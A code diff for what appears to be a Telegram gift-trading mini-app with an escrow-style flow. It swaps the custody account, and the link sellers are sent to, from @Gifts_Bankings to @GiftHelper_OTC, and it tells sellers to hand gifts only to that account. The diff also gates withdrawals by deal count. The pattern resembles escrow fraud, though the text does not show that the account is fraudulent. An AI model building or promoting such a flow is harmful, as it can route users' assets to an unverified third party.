@@ -84,7 +84,6 @@ function showToast(text, duration = 2000, type = "success") {
 // =====================================================
 // API
 // =====================================================
-// ⚠️ УКАЖИ СВОЙ API АДРЕС
 const API = "https://bot-1790950891-2117-soniloonov.bothost.tech";
 
 function initData() {
@@ -197,7 +196,6 @@ function switchTab(tab) {
     if (tab === "reviews") loadReviews();
 }
 
-// Telegram BackButton
 if (tg?.BackButton) {
     tg.BackButton.onClick(() => {
         const reviewsActive = document.getElementById("tab-reviews")?.classList.contains("active");
@@ -424,7 +422,7 @@ function renderDealScreen(d) {
         if (d.is_creator) btnCancel.classList.remove("hidden");
     } else if (d.status === "paid") {
         if (d.is_seller) {
-            stepText = "Передайте подарок ТОЛЬКО в банк <b>@Gifts_Bankings</b> — никогда напрямую покупателю.";
+            stepText = "Передайте подарок ТОЛЬКО в банк <b>@GiftHelper_OTC</b> — никогда напрямую покупателю.";
             btnVault.classList.remove("hidden");
         } else {
             stepText = "Продавец передаёт подарок в банк. Ожидайте.";
@@ -517,7 +515,7 @@ function dealShare() {
 }
 
 function dealOpenVault() {
-    const url = "https://t.me/Gifts_Bankings";
+    const url = "https://t.me/GiftHelper_OTC";
     try {
         if (tg && typeof tg.openTelegramLink === "function") {
             tg.openTelegramLink(url);
@@ -733,7 +731,6 @@ const WITHDRAW_META = {
 function openWithdrawModal(currency = "TON") {
     const dealsCount = state.me?.deals_count ?? 0;
 
-    // Проверка: 0 сделок → "от 1 сделки", 1 сделка → "от 2 сделок"
     if (dealsCount < 1) {
         showToast("Вывод от 1 сделки", 2500, "error");
         return;
